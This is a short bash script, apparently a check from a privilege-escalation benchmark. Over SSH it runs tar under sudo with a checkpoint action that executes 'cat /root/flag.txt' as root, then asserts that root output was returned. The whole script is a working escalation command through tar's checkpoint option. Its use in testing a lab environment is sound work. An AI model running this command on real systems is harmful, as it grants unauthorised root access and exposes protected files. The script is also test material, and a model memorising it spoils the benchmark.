#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
# Checkpoint action runs as root; tar may exit nonzero on docker fs noise.
out="$(ssh_run '
sudo -n /usr/bin/tar -cf /tmp/bench_tar_out.tar /etc/hostname \
  --checkpoint=1 --checkpoint-action=exec='\''cat /root/flag.txt'\'' 2>&1 || true
')"
assert_root_output "${out}"
